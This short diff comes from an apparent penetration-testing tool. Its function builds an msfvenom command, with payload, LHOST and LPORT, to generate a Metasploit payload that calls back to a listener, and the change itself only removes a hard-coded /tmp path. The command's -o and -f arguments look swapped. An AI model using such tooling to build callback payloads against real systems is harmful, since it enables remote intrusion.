@@ -22,8 +22,6 @@ def autogen_msf(filename, retval = {}):
 	fd = tempfile.NamedTemporaryFile('rb', suffix=extension)
 	generated_file = fd.name
 
-	generated_file = "/tmp/autogen.{}".format(extension)
-
 	command = "{msfv} -p {pl} LHOST={lh} LPORT={lp} -o exe -f {gen}".format(
 			msfv = MSFVENOM,
 			pl = PAYLOAD,
